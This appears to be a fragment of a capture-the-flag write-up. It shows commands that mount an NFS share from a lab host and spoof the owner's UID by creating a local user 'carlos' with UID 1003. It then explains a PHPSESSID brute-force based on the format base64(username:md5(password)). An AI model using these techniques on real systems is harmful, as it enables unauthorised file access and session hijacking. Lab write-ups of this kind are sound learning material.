# After mounting the shared directory with our local directory, the file can be opened with user_id 1003

```
#sudo mount -t nfs 10.201.118.192:/mnt/share /tmp/hijack
```
<img width="864" height="66" alt="image" src="https://github.com/user-attachments/assets/a9f7adbb-2594-4aa5-9a72-a919f71c7b7a" />

# Create a new user_id 1003 with username 'carlos'

```
#sudo useradd -u 1003 carlos
#sudo passwd carlos
```

# Change user into carlos and check the mounted directory hijack
```
#su carlos
#/bin/bash
#cd /tmp/hijack
```

# PHPSESSID BruteForce [PHPSESSID = base64(username:md5(password))]
When you reload the page, you will see PHPSESSID in inspect mode

<img width="860" height="362" alt="image" src="https://github.com/user-attachments/assets/42b894cc-ba45-493b-8413-a0143470e575" />
